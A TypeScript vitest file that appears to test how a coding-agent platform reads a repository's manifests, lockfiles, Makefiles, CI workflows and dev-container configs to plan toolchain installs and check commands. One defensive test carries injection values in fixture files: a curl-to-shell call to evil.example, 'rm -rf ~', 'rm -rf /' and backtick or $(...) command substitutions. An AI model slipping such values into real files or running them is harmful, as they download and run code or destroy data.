import { describe, expect, it } from "vitest";
import type { Workspace } from "../src/coding/workspace/types";
import { environmentKey } from "../src/coding/environment-cache";
import { detectConfiguredSetup, detectRepository, devcontainerSetupScript, environmentBrief, hasMiseTask, isUnpinned, UNPINNED_TTL_MS, unpinnedKeyParts, makeTargets, nodeRange, pendingItems, pnpmPostinstall, provisionPlan, pythonRange, type RepoFiles, type RepoProfile, workflowCommands } from "../src/coding/repo-environment";
import { GO_REPO, installed, MISE_REPO, NPM_REPO, PIP_REPO, PNPM_REPO, RUST_REPO, UV_REPO } from "./fixtures/repos";

// What a coding thread reads from a repository's checkout to provision its workspace and tell its agent how to check
// its work, over small repositories in test/fixtures/repos.ts. The thread's own tests (coding-thread-do.test.ts) run
// the plan in a workspace.

/** A repository's files from a map of paths to text, listed as a workspace lists them: sorted by name. */
function filesOf(repo: Record<string, string>): RepoFiles {
	return {
		list: async (dir) => {
			const prefix = dir ? `${dir}/` : "";
			const entries = new Map<string, { name: string; dir: boolean; size: number }>();
			for (const [path, text] of Object.entries(repo)) {
				if (text === undefined || !path.startsWith(prefix)) continue;
				const [name, ...rest] = path.slice(prefix.length).split("/");
				entries.set(name!, { name: name!, dir: rest.length > 0, size: text.length });
			}
			return [...entries.values()].sort((a, b) => (a.name < b.name ? -1 : 1));
		},
		read: async (path) => repo[path] ?? null,
	};
}

const detect = (repo: Record<string, string>) => detectRepository(filesOf(repo));
const scripts = (profile: RepoProfile) => provisionPlan(profile).map((step) => step.script);
const commands = (profile: RepoProfile) => profile.testCommands.map((each) => each.command);

describe("what a repository needs", () => {
	it("pins Go to go.mod's toolchain over its go directive and the Dockerfile's image, and finds its checks in the Makefile and CI", async () => {
		const profile = await detect(GO_REPO);
		expect(profile.toolchains).toEqual([{ tool: "go", version: "1.22.5", source: "manifest", from: "go.mod" }]);
		expect(scripts(profile)).toEqual([installed("go@1.22.5"), "go mod download"]);
		// The Makefile's test and lint targets (not build or deploy), then the workflow's checks: its continued line joined, `make test` once, and no install, echo or secret-using lines.
		expect(commands(profile)).toEqual(["make test", "make lint", "go vet ./...", "go test -race -count=1 ./..."]);
		expect(profile.testCommands[2]).toEqual({ command: "go vet ./...", source: "ci", from: ".github/workflows/ci.yml" });
		expect(profile.notes).toEqual([".github/workflows/ci.yml starts the services postgres, redis, which aren't running here"]);
	});

	it("installs go.mod's go directive when it names no toolchain, and the Dockerfile's version never wins over it", async () => {
		const profile = await detect({ "go.mod": "module m\n\ngo 1.21.3\n", Dockerfile: "FROM golang:1.23\n" });
		expect(profile.toolchains).toEqual([{ tool: "go", version: "1.21.3", source: "manifest", from: "go.mod" }]);
		// Nothing but go.mod: Go's own checks, as no file names others. No go.sum, no download.
		expect(commands(profile)).toEqual(["go vet ./...", "go test ./..."]);
		expect(scripts(profile)).toEqual([installed("go@1.21.3")]);
	});

	it("pins Node to .nvmrc over engines and pnpm to packageManager, and runs package.json's checks with pnpm", async () => {
		const profile = await detect(PNPM_REPO);
		expect(profile.toolchains).toEqual([
			{ tool: "node", version: "20.11.1", source: "manifest", from: ".nvmrc" },
			{ tool: "pnpm", version: "9.15.0", source: "manifest", from: "package.json" },
		]);
		expect(scripts(profile)).toEqual([installed("node@20.11.1"), installed("npm:pnpm@9.15.0", pnpmPostinstall("9.15.0")), "pnpm install --frozen-lockfile"]);
		expect(profile.dependencies).toEqual([{ tool: "pnpm", command: "pnpm install --frozen-lockfile", from: "pnpm-lock.yaml", needs: ["node", "pnpm"] }]);
		// test, lint and typecheck, but not test:watch, lint:fix, build or dev; then the Gitea workflow's own spelling of the test.
		expect(commands(profile)).toEqual(["pnpm run test", "pnpm run lint", "pnpm run typecheck", "pnpm test"]);
		expect(profile.testCommands.at(-1)).toEqual({ command: "pnpm test", source: "ci", from: ".gitea/workflows/check.yaml" });
	});

	it("takes Node from engines when nothing else pins it, runs npm ci, and passes over npm's placeholder test script", async () => {
		const profile = await detect(NPM_REPO);
		expect(profile.toolchains).toEqual([{ tool: "node", version: "20", source: "manifest", from: "package.json" }]);
		expect(scripts(profile)).toEqual([installed("node@20"), "npm ci"]);
		expect(commands(profile)).toEqual(["npm run lint"]);
	});

	it("uses the image's Node, pnpm and Yarn when nothing pins them, and installs no dependencies without a lockfile", async () => {
		const profile = await detect({ "package.json": JSON.stringify({ scripts: { test: "node --test" } }), "yarn.lock": "" });
		expect(profile.toolchains).toEqual([
			{ tool: "node", version: null, source: "image", from: "package.json" },
			{ tool: "yarn", version: null, source: "image", from: "package.json" },
		]);
		expect(pendingItems(profile).toolchains.map((each) => each.status)).toEqual(["present", "present"]);
		expect(scripts(profile)).toEqual(["yarn install --frozen-lockfile"]);
		expect(commands(profile)).toEqual(["yarn run test"]);
		const unlocked = await detect({ "package.json": "{}" });
		expect(scripts(unlocked)).toEqual([]);
		expect(unlocked.notes).toEqual(["package.json has no lockfile, so its dependencies aren't installed"]);
	});

	it("installs a uv project's lowest supported Python and uv, syncs it frozen, and runs pytest through uv", async () => {
		const profile = await detect(UV_REPO);
		expect(profile.toolchains).toEqual([
			{ tool: "python", version: "3.11", source: "manifest", from: "pyproject.toml" },
			{ tool: "uv", version: "latest", source: "default", from: "uv.lock" },
		]);
		expect(scripts(profile)).toEqual([installed("python@3.11"), installed("uv@latest"), "uv sync --frozen"]);
		expect(profile.testCommands).toEqual([{ command: "uv run pytest", source: "default", from: "pyproject.toml" }]);
	});

	it("pins Python to .python-version and installs requirements into a virtual environment", async () => {
		const profile = await detect(PIP_REPO);
		expect(profile.toolchains[0]).toEqual({ tool: "python", version: "3.12.4", source: "manifest", from: ".python-version" });
		expect(scripts(profile)).toEqual([installed("python@3.12.4"), installed("uv@latest"), "uv venv --allow-existing && uv pip install -r requirements-dev.txt -r requirements.txt"]);
		expect(profile.testCommands).toEqual([{ command: ".venv/bin/python -m pytest", source: "default", from: "requirements-dev.txt" }]);
		// A Python repository that pins nothing gets the default Python, and no uv when there is nothing to install.
		expect(scripts(await detect({ "setup.py": "" }))).toEqual([installed("python@3.13")]);
	});

	it("pins Rust to rust-toolchain.toml's channel, not Cargo.toml's rust-version, and fetches the locked crates", async () => {
		const profile = await detect(RUST_REPO);
		expect(profile.toolchains).toEqual([{ tool: "rust", version: "1.79.0", source: "manifest", from: "rust-toolchain.toml" }]);
		expect(scripts(profile)).toEqual([installed("rust@1.79.0"), "cargo fetch --locked"]);
		expect(commands(profile)).toEqual(["cargo test"]);
		// Without a toolchain file, stable; the legacy plain rust-toolchain file is read too.
		expect((await detect({ "Cargo.toml": "" })).toolchains).toEqual([{ tool: "rust", version: "stable", source: "default", from: "Cargo.toml" }]);
		expect((await detect({ "Cargo.toml": "", "rust-toolchain": "nightly-2024-05-01\n" })).toolchains[0]!.version).toBe("nightly-2024-05-01");
	});

	it("installs a mise repository's tools with mise, over its other pins, and adds what only a dev container feature names", async () => {
		const profile = await detect(MISE_REPO);
		expect(profile.mise).toBe("mise.toml");
		expect(profile.toolchains).toEqual([
			{ tool: "go", version: "1.23.2", source: "mise", from: "mise.toml" },
			{ tool: "node", version: "22", source: "mise", from: "mise.toml" },
			{ tool: "npm:prettier", version: "3.3.3", source: "mise", from: "mise.toml" },
			{ tool: "python", version: "3.12", source: "devcontainer", from: ".devcontainer/devcontainer.json" },
		]);
		// One `mise install` for mise's tools; Go isn't installed again from go.mod or the dev container.
		expect(scripts(profile)).toEqual(["mise trust --yes --quiet && mise install --yes", installed("python@3.12")]);
		expect(commands(profile)).toEqual(["mise run test", "mise run lint:go", "mise run check"]);
		expect(profile.notes).toEqual(["The dev container feature docker-in-docker (.devcontainer/devcontainer.json) isn't installed"]);
		// .tool-versions, with asdf's names for tools.
		const asdf = await detect({ ".tool-versions": "golang 1.22.1\nnodejs 20.10.0 18.0.0 # two\n" });
		expect(asdf.toolchains.map(({ tool, version, source }) => `${tool}@${version}:${source}`)).toEqual(["go@1.22.1:mise", "node@20.10.0:mise"]);
	});

	it("never puts what isn't a plain version word into a script", async () => {
		const profile = await detect({
			"go.mod": "module m\n\ngo 1.22\n\ntoolchain go1.22.5;curl${IFS}evil.example|sh\n",
			".nvmrc": "$(rm -rf ~)\n",
			"package.json": JSON.stringify({ packageManager: "pnpm@`id`", scripts: { "test; rm -rf /": "x" } }),
			"pnpm-lock.yaml": "",
			Makefile: "test$(shell id):\n\ttrue\n",
		});
		expect(scripts(profile)).toEqual([installed("go@1.22"), "pnpm install --frozen-lockfile"]);
		expect(commands(profile)).toEqual(["go vet ./...", "go test ./..."]);
	});

	it("reads nothing from a repository with nothing to provision, and says so to the agent with nothing", async () => {
		const profile = await detect({ "README.md": "# Notes\n" });
		expect(profile).toEqual({ toolchains: [], dependencies: [], testCommands: [], notes: [], mise: null });
		expect(provisionPlan(profile)).toEqual([]);
		expect(environmentBrief({ ...pendingItems(profile), testCommands: [], notes: [] })).toBeNull();
	});

	it("keys the environment by the versions it detects, so a new pin is a new environment and an unrelated change isn't", async () => {
		const keyOf = async (repo: Record<string, string>) => environmentKey({ userId: "ada", repo: "acme/widgets", provision: scripts(await detect(repo)), setupScript: null, lockfiles: {}, image: "pim-workspace:local" });
		const key = await keyOf(GO_REPO);
		expect(await keyOf({ ...GO_REPO, "main.go": "package main\n\n// changed\nfunc main() {}\n", Makefile: "test:\n\tgo test ./...\n" })).toBe(key);
		expect(await keyOf({ ...GO_REPO, "go.mod": GO_REPO["go.mod"]!.replace("go1.22.5", "go1.22.6") })).not.toBe(key);
		expect(await keyOf({ ...GO_REPO, "go.sum": undefined } as unknown as Record<string, string>)).not.toBe(key);
		expect(await keyOf({ ...PNPM_REPO, ".nvmrc": "20.12.0\n" })).not.toBe(await keyOf(PNPM_REPO));
		expect(await keyOf({ ...PNPM_REPO, "package.json": PNPM_REPO["package.json"]!.replace("pnpm@9.15.0", "pnpm@9.15.1") })).not.toBe(await keyOf(PNPM_REPO));
	});

	it("tells the agent its toolchains, what failed, and the commands to check its work with", async () => {
		const profile = await detect(GO_REPO);
		const items = pendingItems(profile);
		const brief = environmentBrief({
			toolchains: items.toolchains.map((each) => ({ ...each, status: "installed" })),
			dependencies: items.dependencies.map((each) => ({ ...each, status: "failed", error: "`go mod download` exited 1: dial tcp: lookup proxy.golang.org: no such host" })),
			testCommands: profile.testCommands,
			notes: profile.notes,
		})!;
		expect(brief).toContain("Toolchains set up for this repository: go 1.22.5 (from go.mod).");
		expect(brief).toContain("`go mod download` (from go.sum) failed while the workspace was set up: `go mod download` exited 1: dial tcp");
		expect(brief).toContain("- `make test` (Makefile)\n- `make lint` (Makefile)\n- `go vet ./...` (.github/workflows/ci.yml)");
		expect(brief).toContain("starts the services postgres, redis, which aren't running here.");
	});
});

describe("reading versions and commands", () => {
	it("turns Node ranges into the version mise installs, and leaves open ranges to the image", () => {
		const cases: [string, string | null][] = [
			["20", "20"],
			["v20.11.1", "20.11.1"],
			["^20.11.0", "20"],
			["~20.11.0", "20.11"],
			["20.x", "20"],
			["20.11.x", "20.11"],
			["^18 || ^20", "20"],
			[">=18", null],
			[">=18 <21", null],
			["*", null],
		];
		for (const [range, version] of cases) expect([range, nodeRange(range)]).toEqual([range, version]);
	});

	it("turns requires-python into the version that meets it", () => {
		expect(pythonRange(">=3.10")).toBe("3.10");
		expect(pythonRange(">= 3.9, <4")).toBe("3.9");
		expect(pythonRange("~=3.12.1")).toBe("3.12");
		expect(pythonRange("==3.11.*")).toBe("3.11");
		expect(pythonRange("<3.13")).toBeNull();
	});

	it("finds a Makefile's check targets however they are declared, and not variables or other targets", () => {
		expect(makeTargets("check lint: deps\n\ttrue\ntest-unit:\n\ttrue\ntest::\n\ttrue\nTESTS := a\ntestdata/%.out: x\n\ttrue\nlint-fix:\n\ttrue\n")).toEqual(["check", "lint", "test-unit", "test"]);
	});

	it("reads folded and literal run blocks, and stops at the step's end", () => {
		const workflow = "steps:\n  - run: >-\n      cargo clippy\n      --all-targets\n    env:\n      X: test\n  - name: t\n    run: 'cargo test --locked'\n";
		expect(workflowCommands(workflow)).toEqual(["cargo clippy --all-targets", "cargo test --locked"]);
	});
});

describe("setup sources a repository's configuration describes", () => {
	const MISE = '[tools]\nnode = "22"\n\n[tasks.setup]\nrun = "pnpm install"\n';
	const DEVCONTAINER = '{ "onCreateCommand": "echo create", "postCreateCommand": "pnpm install" }';

	it("finds a task named setup in mise.toml or .mise.toml, in the forms mise accepts, and not one that only looks like it", () => {
		expect(hasMiseTask("[tasks.setup]\nrun = 'x'\n", "setup")).toBe(true);
		expect(hasMiseTask('[tasks."setup"]\nrun = "x"\n', "setup")).toBe(true);
		expect(hasMiseTask('[tasks]\nsetup = "pnpm install"\n', "setup")).toBe(true);
		expect(hasMiseTask('tasks.setup = "pnpm install"\n', "setup")).toBe(true);
		expect(hasMiseTask('[tasks.setup-db]\nrun = "x"\n[tasks.test]\nsetup = "x"\n', "setup")).toBe(false);
		expect(hasMiseTask('[tools]\nsetup = "1"\n# [tasks.setup]\n', "setup")).toBe(false);
	});

	it("runs a mise setup task with mise run setup, from either file, and covers the file's text", async () => {
		const found = await detectConfiguredSetup(filesOf({ ".mise.toml": MISE }));
		expect(found).toEqual({ script: "mise trust --yes --quiet && mise run setup", source: "mise", content: `.mise.toml\n${MISE}` });
		expect((await detectConfiguredSetup(filesOf({ "mise.toml": MISE })))?.source).toBe("mise");
		expect(await detectConfiguredSetup(filesOf({ "mise.toml": '[tasks.test]\nrun = "x"\n' }))).toBeNull();
	});

	it("prefers a mise task to a dev container's commands, and only runs one", async () => {
		const found = await detectConfiguredSetup(filesOf({ "mise.toml": MISE, ".devcontainer/devcontainer.json": DEVCONTAINER }));
		expect(found?.source).toBe("mise");
		expect(found?.script).not.toContain("echo create");
		expect((await detectConfiguredSetup(filesOf({ "mise.toml": "[tools]\n", ".devcontainer.json": DEVCONTAINER })))?.source).toBe("devcontainer");
	});

	it("runs a dev container's string, array and object commands in its lifecycle order", () => {
		const script = devcontainerSetupScript({
			postCreateCommand: { install: "pnpm install", build: ["pnpm", "run", "build the app"] },
			updateContentCommand: ["echo", "it's", "$HOME"],
			onCreateCommand: "  make init  ",
		});
		expect(script).toBe("set -e\n(\nmake init\n)\necho 'it'\\''s' '$HOME'\n(\npnpm install\n)\npnpm run 'build the app'\n");
		expect(devcontainerSetupScript({ onCreateCommand: "" , postCreateCommand: [], updateContentCommand: [1], image: "x" })).toBeNull();
		expect(devcontainerSetupScript(null)).toBeNull();
	});

	it("reads a dev container written with comments, and passes over one with no commands", async () => {
		const jsonc = '{\n // set up\n "image": "x", /* hi */ "postCreateCommand": "npm ci",\n}';
		expect((await detectConfiguredSetup(filesOf({ ".devcontainer/devcontainer.json": jsonc })))?.script).toBe("set -e\n(\nnpm ci\n)\n");
		expect(await detectConfiguredSetup(filesOf({ ".devcontainer/devcontainer.json": '{ "image": "x" }' }))).toBeNull();
	});
});

describe("toolchains that aren't pinned", () => {
	/** A workspace whose `mise latest` answers from `versions`, or fails. */
	const resolving = (versions: Record<string, string>): Workspace =>
		({
			async *exec(cmd: string[]) {
				const version = versions[cmd[3]!];
				if (version) yield { type: "stdout", data: `${version}\n` };
				yield { type: "exit", code: version ? 0 : 1 };
			},
		}) as unknown as Workspace;
	const lts = [{ tool: "node", version: "lts", source: "manifest", from: ".nvmrc" }] as const;
	const keyWith = (unpinned: string[]) => environmentKey({ userId: "ada", repo: "acme/widgets", provision: [], setupScript: null, unpinned, lockfiles: {}, image: "img" });

	it("names the unpinned versions only, not exact ones or prefixes", () => {
		for (const version of ["lts", "stable", "latest", "current"]) expect(isUnpinned(version)).toBe(true);
		for (const version of ["22", "1.22.5", null]) expect(isUnpinned(version)).toBe(false);
	});

	it("puts the version mise resolves in the key, so a new release is a new environment", async () => {
		const before = await unpinnedKeyParts(resolving({ "node@lts": "22.1.0" }), lts, 0, "/repo");
		const after = await unpinnedKeyParts(resolving({ "node@lts": "22.2.0" }), lts, 0, "/repo");
		expect(before).toEqual(["node@lts=22.1.0"]);
		expect(await keyWith(before)).toBe(await keyWith(await unpinnedKeyParts(resolving({ "node@lts": "22.1.0" }), lts, 10 * UNPINNED_TTL_MS, "/repo")));
		expect(await keyWith(before)).not.toBe(await keyWith(after));
		const pnpm = [{ tool: "pnpm", version: "latest", source: "default", from: "package.json" }] as const;
		expect(await unpinnedKeyParts(resolving({ "npm:pnpm@latest": "9.1.0" }), pnpm, 0, "/repo")).toEqual(["pnpm@latest=9.1.0"]);
	});

	it("expires the key every seven days when the version can't be resolved", async () => {
		const stuck = resolving({});
		const week = async (at: number) => keyWith(await unpinnedKeyParts(stuck, lts, at, "/repo"));
		expect(await unpinnedKeyParts(stuck, lts, 0, "/repo")).toEqual(["node@lts=ttl:0"]);
		expect(await week(UNPINNED_TTL_MS - 1)).toBe(await week(0));
		expect(await week(UNPINNED_TTL_MS)).not.toBe(await week(0));
	});

	it("adds nothing when every toolchain is pinned", async () => {
		expect(await unpinnedKeyParts(resolving({}), [{ tool: "go", version: "1.22.5", source: "manifest", from: "go.mod" }], 0, "/repo")).toEqual([]);
	});
});
